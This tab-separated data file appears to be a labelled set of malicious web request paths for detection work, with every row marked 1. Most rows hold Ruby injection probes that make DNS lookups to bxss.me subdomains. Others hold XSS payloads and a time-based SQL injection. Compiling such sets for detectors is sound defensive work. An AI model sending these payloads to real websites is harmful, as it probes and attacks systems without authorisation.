sentences	labels
socket.gethostbyname('hitsg' 'bwttwtqg20814.bxss.me.')[3].to_s) '/**/images/result.css 	 1
socket.gethostbyname('hitfy' 'bcwdaevf889b3.bxss.me.')[3].to_s) '/****/website.js 	 1
/******/system/2018/01/18/javascript:window.close(); 	 1
/******/system/2017/11/10/javascript:window.print() 	 1
/******/system/2016/08/03/javascript:void(0); 	 1
/******/system/2016/12/08/javascript:window.close(); 	 1
/******/system/2017/08/06/javascript:window.print() 	 1
/******/n239584'||'/n239608/n239626/index.html 	 1
socket.gethostbyname(""hitak"" ""sohnpvwm9fa9f.bxss.me."")[3].to_s) ""/*******/css/jpage.css 	 1
socket.gethostbyname('hittr' 'huljsytk988f9.bxss.me.')[3].to_s) '/*********/pinterest_grid.js 	 1
/******/?--></script><script>alert(237)</script> 	 1
socket.gethostbyname('hitjh' 'hjpzqvdc39bb7.bxss.me.')[3].to_s) '/****/list.html 	 1
socket.gethostbyname(""hitcf"" ""mhpadqyid427b.bxss.me."")[3].to_s) ""/****/202001/t20200119_146666.html 	 1
socket.gethostbyname(""hitqu"" ""phgiybkx064c2.bxss.me."")[3].to_s) ""/******/t20210906_186411.html 	 1
socket.gethostbyname(""hitpc"" ""pejmiync51f52.bxss.me."")[3].to_s) ""/****/ 	 1
socket.gethostbyname(""hitnc"" ""filvzypodc16a.bxss.me."")[3].to_s) ""/***/jpage/jquery.jpage.js 	 1
socket.gethostbyname('hitzq' 'ruhqorxt2bd20.bxss.me.')[3].to_s) '/********/jcse/110105008056111/16/images/view.js 	 1
socket.gethostbyname(""hityv"" ""chyczyuye4225.bxss.me."")[3].to_s) ""/*******/jquery.window.js 	 1
socket.gethostbyname(""hitae"" ""trvckcse8fb63.bxss.me."")[3].to_s) ""/*******/cookie/jquery.cookie.js 	 1
/******/system/2021/09/13/javascript:void(); 	 1
socket.gethostbyname('hitju' 'vojvtusa13c34.bxss.me.')[3].to_s) '/******/t20210806_185416.html 	 1
socket.gethostbyname('hitrz' 'fhlmhwob372a1.bxss.me.')[3].to_s) '/********/jcse/110105008056111/16/images/plugin/websitechange/zwdt_v3.css 	 1
socket.gethostbyname(""hityq"" ""qdlmfaax96d6c.bxss.me."")[3].to_s) ""/******/searchbtn.js 	 1
socket.gethostbyname('hittx' 'lelkrjee9ff86.bxss.me.')[3].to_s) '/****/1104/list.html 	 1
/******/system/2012/07/24/010836164.shtml 	 1
socket.gethostbyname('hitvr' 'afhksgmvd8c02.bxss.me.')[3].to_s) '/***************/16/images/ui.css 	 1
socket.gethostbyname(""hitnt"" ""thgkaznbd9114.bxss.me."")[3].to_s) ""/***/phone.js 	 1
socket.gethostbyname(""hithr"" ""dlfqqflla809b.bxss.me."")[3].to_s) ""/******/qzqd/202011/t20201106_2279316.html 	 1
socket.gethostbyname(""hituh"" ""ymfhwuxieb762.bxss.me."")[3].to_s) ""/******/selectpick/js.js 	 1
socket.gethostbyname('hitgd' 'eaxlmurd048e0.bxss.me.')[3].to_s) '/********/jcse/110105008056111/16/images/searchbtn.js 	 1
socket.gethostbyname('hitqh' 'dsjzyrdx0dfdb.bxss.me.')[3].to_s) '/*****/hfswsj/202109/t20210906_186411.html 	 1
/¦¯¡å¡åxor(if(now()=sysdate(),sleep(12),0))xor""z/******/gytdsdfwzs/zzq/zcwj.htm 	 1
socket.gethostbyname(""hitit"" ""ikvhmter40cf6.bxss.me."")[3].to_s) ""/***/themes/image.css 	 1
/******/system/2017/11/22/javascript:window.print() 	 1
/******/n239584/n239608/n239616/index'||'.html 	 1
socket.gethostbyname(""hitxe"" ""nvrvzjbm61dc1.bxss.me."")[3].to_s) ""/**/images/ui.css 	 1
socket.gethostbyname('hitvw' 'iwzseodlab436.bxss.me.')[3].to_s) '/****/10/11/art_34_242318.html 	 1
socket.gethostbyname('hitbr' 'odaovham1f531.bxss.me.')[3].to_s) '/***************/16/images/plugin/voice/voice.css 	 1
/******/qhkc/? 	 1
/******/system/2016/06/08/javascript:window.print() 	 1
/******/qhkc/javascript:void(0) 	 1
/******/system/2017/03/05/javascript:void(0); 	 1
/******/system/2017/07/15/javascript:window.close(); 	 1
/******/system/2020/10/16/javascript:void(); 	 1
socket.gethostbyname(""hitoz"" ""pfurwpvu3d6b4.bxss.me."")[3].to_s) ""/**/images/main.css 	 1
/******/system/2017/08/16/javascript:void(); 	 1
socket.gethostbyname('hitwl' 'npvxahpf5f8cf.bxss.me.')[3].to_s) '/******/tjj/zfxxgkml_2127/xwfbh_2065/list.html 	 1
/******/system/2016/08/20/javascript:void(); 	 1
/******/system/2016/10/07/javascript:window.close(); 	 1
socket.gethostbyname(""hitgy"" ""iqyspgfs62550.bxss.me."")[3].to_s) ""/******/voice/hzrecorder.js 	 1
/******/system/2018/02/04/javascript:window.close(); 	 1
socket.gethostbyname(""hitfl"" ""kiaadwwz01110.bxss.me."")[3].to_s) ""/****/list.html 	 1
/******/sjd/javascript:void(0) 	 1
socket.gethostbyname(""hitky"" ""wvskrjgl6b8f5.bxss.me."")[3].to_s) ""/**/images/searchbtn.js 	 1
socket.gethostbyname(""hitpn"" ""vthvzgdm821de.bxss.me."")[3].to_s) ""/****/110105008056111/16/images/condition.js 	 1
/******/system/2017/11/15/javascript:window.print() 	 1
socket.gethostbyname('hittp' 'tsmemnup49420.bxss.me.')[3].to_s) '/****/1105/list.html 	 1
socket.gethostbyname(""hitqt"" ""docompvx65db2.bxss.me."")[3].to_s) ""/*****/hfswsj/ 	 1
/******/system/2021/12/19/javascript:void(); 	 1
socket.gethostbyname('hitky' 'hybvqvxf57438.bxss.me.')[3].to_s) '/*******/list.html 	 1
/******/system/2021/06/09'""/><iframe src=javascript:alert(2418) /013399706.shtml 	 1
socket.gethostbyname(""hitbl"" ""mskggftfc11f5.bxss.me."")[3].to_s) ""/*****/ckplayer/ckplayer.js 	 1
